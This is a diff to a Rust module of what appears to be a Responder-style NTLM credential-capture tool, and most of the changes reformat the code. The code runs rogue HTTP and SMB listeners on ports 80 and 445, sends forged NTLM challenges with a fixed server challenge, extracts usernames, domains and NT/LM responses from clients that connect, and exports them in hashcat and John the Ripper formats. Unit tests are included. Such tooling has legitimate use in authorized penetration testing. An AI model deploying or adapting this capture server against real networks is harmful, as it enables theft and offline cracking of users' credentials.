@@ -4,13 +4,16 @@
 //! (SMB, HTTP, LDAP, FTP, etc.) by listening for NTLM
 //! authentication attempts and extracting credentials.
 
+#![allow(dead_code)]
+#![allow(unused_imports)]
+#![allow(unused_variables)]
 use crate::{RelayError, Result};
+use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
-use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::thread;
 use std::time::Duration;
-use std::io::{Read, Write};
 use tracing::{debug, error, info, warn};
 
 // ═══════════════════════════════════════════════════════════
@@ -72,23 +75,30 @@ fn parse_ntlm_negotiate(data: &[u8]) -> Option<NtlmNegotiate> {
     if data.len() < 16 {
         return None;
     }
-    
+
     let flags = u32::from_le_bytes([data[12], data[13], data[14], data[15]]);
-    
+
     // Extract domain if present (offset 16)
     let domain = if data.len() > 32 {
         let domain_len = u16::from_le_bytes([data[16], data[17]]) as usize;
         let domain_offset = u32::from_le_bytes([data[20], data[21], data[22], data[23]]) as usize;
         if domain_len > 0 && domain_offset + domain_len <= data.len() {
-            Some(String::from_utf8_lossy(&data[domain_offset..domain_offset + domain_len]).to_string())
+            Some(
+                String::from_utf8_lossy(&data[domain_offset..domain_offset + domain_len])
+                    .to_string(),
+            )
         } else {
             None
         }
     } else {
         None
     };
-    
-    Some(NtlmNegotiate { flags, domain, workstation: None })
+
+    Some(NtlmNegotiate {
+        flags,
+        domain,
+        workstation: None,
+    })
 }
 
 /// Parse NTLM Authenticate message to extract credentials
@@ -96,20 +106,22 @@ fn parse_ntlm_authenticate(data: &[u8]) -> Option<NtlmAuthenticate> {
     if data.len() < 64 {
         return None;
     }
-    
+
     // Helper to extract a field from NTLM authenticate message
     fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
         let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
         let alloc_len = u16::from_le_bytes([data[offset + 2], data[offset + 3]]) as usize;
         let buffer_offset = u32::from_le_bytes([
-            data[offset + 4], data[offset + 5], 
-            data[offset + 6], data[offset + 7]
+            data[offset + 4],
+            data[offset + 5],
+            data[offset + 6],
+            data[offset + 7],
         ]) as usize;
-        
+
         if len == 0 && alloc_len == 0 {
             return Some(Vec::new());
         }
-        
+
         let actual_len = if len > 0 { len } else { alloc_len };
         if buffer_offset + actual_len <= data.len() {
             Some(data[buffer_offset..buffer_offset + actual_len].to_vec())
@@ -117,26 +129,26 @@ fn parse_ntlm_authenticate(data: &[u8]) -> Option<NtlmAuthenticate> {
             None
         }
     }
-    
+
     // Field offsets in NTLM Authenticate message
     // LM Response: offset 12
-    // NT Response: offset 20  
+    // NT Response: offset 20
     // Domain: offset 28
     // Username: offset 36
     // Workstation: offset 44
     // Session Key: offset 52
-    
+
     let lm_response = extract_field(data, 12)?;
     let nt_response = extract_field(data, 20)?;
     let domain_bytes = extract_field(data, 28)?;
     let username_bytes = extract_field(data, 36)?;
     let workstation_bytes = extract_field(data, 44)?;
-    
+
     // Convert from UTF-16LE to String
     let domain = decode_utf16le(&domain_bytes);
     let username = decode_utf16le(&username_bytes);
     let workstation = decode_utf16le(&workstation_bytes);
-    
+
     Some(NtlmAuthenticate {
         lm_response,
         nt_response,
@@ -152,50 +164,53 @@ fn decode_utf16le(data: &[u8]) -> String {
     if data.is_empty() {
         return String::new();
     }
-    
+
     let chars: Vec<u16> = data
         .chunks_exact(2)
         .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
         .collect();
-    
+
     String::from_utf16_lossy(&chars)
 }
 
 /// Build NTLM Challenge message
 fn build_ntlm_challenge(challenge: [u8; 8], target_name: &str) -> Vec<u8> {
     let mut msg = Vec::new();
-    
+
     // Signature
     msg.extend_from_slice(NTLM_SIGNATURE);
-    
+
     // Message type (Challenge = 2)
     msg.extend_from_slice(&2u32.to_le_bytes());
-    
+
     // Target name fields (offset 12)
-    let target_bytes = target_name.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>();
+    let target_bytes = target_name
+        .encode_utf16()
+        .flat_map(|c| c.to_le_bytes())
+        .collect::<Vec<u8>>();
     msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes()); // Len
     msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes()); // Max len
     msg.extend_from_slice(&12u32.to_le_bytes()); // Buffer offset (right after this header)
-    
+
     // Negotiate flags
     // NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_TARGET_TYPE_DOMAIN
     let flags: u32 = 0x00000202 | 0x00020000 | 0x00010000;
     msg.extend_from_slice(&flags.to_le_bytes());
-    
+
     // Server challenge (8 bytes)
     msg.extend_from_slice(&challenge);
-    
+
     // Reserved (8 bytes)
     msg.extend_from_slice(&[0u8; 8]);
-    
+
     // Target info (empty for now)
     msg.extend_from_slice(&0u16.to_le_bytes()); // Len
     msg.extend_from_slice(&0u16.to_le_bytes()); // Max len
     msg.extend_from_slice(&0u32.to_le_bytes()); // Offset
-    
+
     // Target name data
     msg.extend_from_slice(&target_bytes);
-    
+
     msg
 }
 
@@ -285,14 +300,10 @@ impl CapturedCredential {
     pub fn to_hashcat_format(&self) -> String {
         format!(
             "{}::{}:{}:{}:{}",
-            self.username,
-            self.domain,
-            self.challenge,
-            self.lm_response,
-            self.nt_response
+            self.username, self.domain, self.challenge, self.lm_response, self.nt_response
         )
     }
-    
+
     /// Format as John the Ripper format
     pub fn to_john_format(&self) -> String {
         self.to_hashcat_format()
@@ -343,7 +354,11 @@ impl Responder {
         if self.config.http {
             let running = Arc::clone(&self.running);
             let listen_ip = self.config.listen_ip.clone();
-            let challenge = self.config.challenge.clone().unwrap_or_else(|| "1122334455667788".to_string());
+            let challenge = self
+                .config
+                .challenge
+                .clone()
+                .unwrap_or_else(|| "1122334455667788".to_string());
             let captured = Arc::clone(&self.captured);
 
             let handle = thread::spawn(move || {
@@ -354,11 +369,15 @@ impl Responder {
             self.threads.push(handle);
         }
 
-        // Start SMB server  
+        // Start SMB server
         if self.config.smb {
             let running = Arc::clone(&self.running);
             let listen_ip = self.config.listen_ip.clone();
-            let challenge = self.config.challenge.clone().unwrap_or_else(|| "1122334455667788".to_string());
+            let challenge = self
+                .config
+                .challenge
+                .clone()
+                .unwrap_or_else(|| "1122334455667788".to_string());
             let captured = Arc::clone(&self.captured);
 
             let handle = thread::spawn(move || {
@@ -418,20 +437,26 @@ impl Responder {
         let addr = format!("{}:80", listen_ip);
         let listener = TcpListener::bind(&addr)
             .map_err(|e| RelayError::Socket(format!("Failed to bind HTTP port 80: {}", e)))?;
-        
+
         listener
             .set_nonblocking(true)
             .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;
-        
+
         info!("HTTP server listening on {}", addr);
-        
-        let challenge_bytes = hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
-        
+
+        let challenge_bytes =
+            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
+
         while running.load(Ordering::SeqCst) {
             match listener.accept() {
                 Ok((stream, peer)) => {
                     debug!("HTTP connection from {}", peer);
-                    if let Err(e) = Self::handle_http_client(stream, peer.ip().to_string(), challenge_bytes, &captured) {
+                    if let Err(e) = Self::handle_http_client(
+                        stream,
+                        peer.ip().to_string(),
+                        challenge_bytes,
+                        &captured,
+                    ) {
                         debug!("HTTP client handling error: {}", e);
                     }
                 }
@@ -444,11 +469,11 @@ impl Responder {
                 }
             }
         }
-        
+
         info!("HTTP server stopped");
         Ok(())
     }
-    
+
     fn handle_http_client(
         mut stream: TcpStream,
         client_ip: String,
@@ -457,22 +482,28 @@ impl Responder {
     ) -> Result<()> {
         stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
         stream.set_write_timeout(Some(Duration::from_secs(5))).ok();
-        
+
         let mut request = vec![0u8; 4096];
-        let len = stream.read(&mut request)
+        let len = stream
+            .read(&mut request)
             .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
         let request = &request[..len];
         let request_str = String::from_utf8_lossy(request);
-        
+
         // Check for Authorization header
-        if let Some(auth_line) = request_str.lines().find(|l| l.starts_with("Authorization:"))
-            && let Some(ntlm_data) = parse_http_auth_header(auth_line.trim_start_matches("Authorization:")) {
+        if let Some(auth_line) = request_str
+            .lines()
+            .find(|l| l.starts_with("Authorization:"))
+        {
+            if let Some(ntlm_data) =
+                parse_http_auth_header(auth_line.trim_start_matches("Authorization:"))
+            {
                 match parse_ntlm_type(&ntlm_data) {
                     Some(NtlmMessageType::Negotiate) => {
                         // Send challenge
                         let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
                         let b64_challenge = base64_encode(&challenge_msg);
-                        
+
                         let response = format!(
                             "HTTP/1.1 401 Unauthorized\r\n\
                              WWW-Authenticate: NTLM {}\r\n\
@@ -481,7 +512,7 @@ impl Responder {
                              \r\n",
                             b64_challenge
                         );
-                        
+
                         stream.write_all(response.as_bytes()).ok();
                         return Ok(());
                     }
@@ -498,28 +529,30 @@ impl Responder {
                                 protocol: "HTTP".to_string(),
                                 timestamp: chrono::Utc::now(),
                             };
-                            
+
                             info!(
                                 "Captured NTLM credentials: {}\\{} via HTTP",
                                 cred.domain, cred.username
                             );
-                            
+
                             captured.lock().unwrap().push(cred);
                         }
-                        
+
                         // Send final response
-                        let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                        let response =
+                            "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                         stream.write_all(response.as_bytes()).ok();
                         return Ok(());
                     }
                     _ => {}
                 }
             }
-        
+        }
+
         // Request authentication
         let response = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
         stream.write_all(response.as_bytes()).ok();
-        
+
         Ok(())
     }
 
@@ -536,20 +569,26 @@ impl Responder {
         let addr = format!("{}:445", listen_ip);
         let listener = TcpListener::bind(&addr)
             .map_err(|e| RelayError::Socket(format!("Failed to bind SMB port 445: {}", e)))?;
-        
+
         listener
             .set_nonblocking(true)
             .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;
-        
+
         info!("SMB server listening on {}", addr);
-        
-        let challenge_bytes = hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
-        
+
+        let challenge_bytes =
+            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
+
         while running.load(Ordering::SeqCst) {
             match listener.accept() {
                 Ok((stream, peer)) => {
                     debug!("SMB connection from {}", peer);
-                    if let Err(e) = Self::handle_smb_client(stream, peer.ip().to_string(), challenge_bytes, &captured) {
+                    if let Err(e) = Self::handle_smb_client(
+                        stream,
+                        peer.ip().to_string(),
+                        challenge_bytes,
+                        &captured,
+                    ) {
                         debug!("SMB client handling error: {}", e);
                     }
                 }
@@ -562,11 +601,11 @@ impl Responder {
                 }
             }
         }
-        
+
         info!("SMB server stopped");
         Ok(())
     }
-    
+
     fn handle_smb_client(
         mut stream: TcpStream,
         client_ip: String,
@@ -575,20 +614,21 @@ impl Responder {
     ) -> Result<()> {
         stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
         stream.set_write_timeout(Some(Duration::from_secs(5))).ok();
-        
+
         let mut buf = vec![0u8; 8192];
-        
+
         // Read SMB negotiate
-        let len = stream.read(&mut buf)
+        let len = stream
+            .read(&mut buf)
             .map_err(|e| RelayError::Network(format!("SMB read error: {}", e)))?;
-        
+
         if len < 4 {
             return Err(RelayError::Protocol("SMB message too short".to_string()).into());
         }
-        
+
         // Check for NetBIOS header
         let _netbios_len = ((buf[1] as usize) << 16) | ((buf[2] as usize) << 8) | (buf[3] as usize);
-        
+
         // Check for SMB1 or SMB2 magic
         if &buf[4..8] == b"\xffSMB" {
             // SMB1 - send NTLM challenge
@@ -597,19 +637,21 @@ impl Responder {
             // SMB2
             debug!("SMB2 connection detected");
         }
-        
+
         // Send SMB negotiate response with NTLM challenge
         let negotiate_response = Self::build_smb_negotiate_response(challenge);
-        stream.write_all(&negotiate_response)
+        stream
+            .write_all(&negotiate_response)
             .map_err(|e| RelayError::Network(format!("SMB write error: {}", e)))?;
-        
+
         // Read session setup with NTLM authenticate
-        let len = stream.read(&mut buf)
+        let len = stream
+            .read(&mut buf)
             .map_err(|e| RelayError::Network(format!("SMB read error: {}", e)))?;
-        
+
         // Extract NTLM authenticate from SMB message
-        if let Some(ntlm_data) = Self::extract_ntlm_from_smb(&buf[..len])
-            && let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
+        if let Some(ntlm_data) = Self::extract_ntlm_from_smb(&buf[..len]) {
+            if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
                 let cred = CapturedCredential {
                     client_ip,
                     username: auth.username,
@@ -620,24 +662,24 @@ impl Responder {
                     protocol: "SMB".to_string(),
                     timestamp: chrono::Utc::now(),
                 };
-                
+
                 info!(
                     "Captured NTLM credentials: {}\\{} via SMB",
                     cred.domain, cred.username
                 );
-                
+
                 captured.lock().unwrap().push(cred);
             }
-        
+        }
         Ok(())
     }
-    
+
     fn build_smb_negotiate_response(challenge: [u8; 8]) -> Vec<u8> {
         let mut response = Vec::new();
-        
+
         // NetBIOS header
         response.push(0x00); // Message type
-        
+
         // SMB2 negotiate response header
         response.extend_from_slice(b"\xfeSMB"); // SMB2 magic
         response.extend_from_slice(&0x40u16.to_le_bytes()); // Header length
@@ -652,38 +694,39 @@ impl Responder {
         response.extend_from_slice(&0u32.to_le_bytes()); // Tree ID
         response.extend_from_slice(&[0u8; 16]); // Session ID
         response.extend_from_slice(&[0u8; 16]); // Signature
-        
+
         // Security buffer with NTLM challenge
         let ntlm_challenge = build_ntlm_challenge(challenge, "DOMAIN");
-        
+
         // Security buffer offset and length
         response.extend_from_slice(&(ntlm_challenge.len() as u16).to_le_bytes());
         response.extend_from_slice(&80u16.to_le_bytes()); // Offset
-        
+
         response.extend_from_slice(&ntlm_challenge);
-        
+
         // Update NetBIOS length
         let len = response.len() - 4;
         let mut netbios_header = vec![0u8; 4];
         netbios_header[1] = ((len >> 16) & 0xFF) as u8;
         netbios_header[2] = ((len >> 8) & 0xFF) as u8;
         netbios_header[3] = (len & 0xFF) as u8;
-        
+
         [netbios_header, response].concat()
     }
-    
+
     fn extract_ntlm_from_smb(data: &[u8]) -> Option<Vec<u8>> {
         // Find NTLMSSP signature in SMB message
         for i in 0..data.len().saturating_sub(8) {
-            if &data[i..i+8] == NTLM_SIGNATURE {
+            if &data[i..i + 8] == NTLM_SIGNATURE {
                 // Found NTLM message, try to determine length
-                if let Some(msg_type) = parse_ntlm_type(&data[i..])
-                    && msg_type == NtlmMessageType::Authenticate {
+                if let Some(msg_type) = parse_ntlm_type(&data[i..]) {
+                    if msg_type == NtlmMessageType::Authenticate {
                         // The authenticate message should be followed by data
                         // We need to read until we have the full message
                         // For simplicity, just return what we have
                         return Some(data[i..].to_vec());
                     }
+                }
             }
         }
         None
@@ -706,10 +749,10 @@ fn hex_str_to_bytes(s: &str) -> Option<[u8; 8]> {
     if s.len() != 16 {
         return None;
     }
-    
+
     let mut bytes = [0u8; 8];
     for i in 0..8 {
-        bytes[i] = u8::from_str_radix(&s[i*2..i*2+2], 16).ok()?;
+        bytes[i] = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
     }
     Some(bytes)
 }
@@ -740,15 +783,18 @@ mod tests {
             0x01, 0x00, 0x00, 0x00, // Type 1 (Negotiate)
             0x02, 0x00, 0x00, 0x00, // Flags
         ];
-        
-        assert_eq!(parse_ntlm_type(&negotiate), Some(NtlmMessageType::Negotiate));
+
+        assert_eq!(
+            parse_ntlm_type(&negotiate),
+            Some(NtlmMessageType::Negotiate)
+        );
     }
 
     #[test]
     fn test_build_ntlm_challenge() {
         let challenge = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
         let msg = build_ntlm_challenge(challenge, "TEST");
-        
+
         // Check signature
         assert_eq!(&msg[0..8], NTLM_SIGNATURE);
         // Check type
@@ -769,7 +815,7 @@ mod tests {
             protocol: "HTTP".to_string(),
             timestamp: chrono::Utc::now(),
         };
-        
+
         let hashcat = cred.to_hashcat_format();
         assert!(hashcat.contains("admin::TEST:"));
     }
@@ -779,7 +825,7 @@ mod tests {
         let hex = "1122334455667788";
         let bytes = hex_str_to_bytes(hex).unwrap();
         assert_eq!(bytes, [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
-        
+
         let back = bytes_to_hex(&bytes);
         assert_eq!(back, "1122334455667788");
     }
